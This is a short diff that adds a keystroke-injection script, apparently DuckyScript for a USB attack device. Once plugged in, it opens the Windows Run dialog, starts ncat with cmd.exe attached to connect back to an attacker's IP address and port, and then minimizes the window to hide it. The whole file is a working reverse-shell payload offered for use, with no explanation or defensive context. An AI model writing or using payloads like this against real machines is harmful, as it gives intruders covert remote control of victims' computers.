@@ -1,0 +1,9 @@
+DELAY 750
+GUI r
+DELAY 750
+STRING cmd /C ncat <ip address> <port> -e cmd.exe
+ENTER
+DELAY 750
+ALT SPACE
+DELAY 200
+n
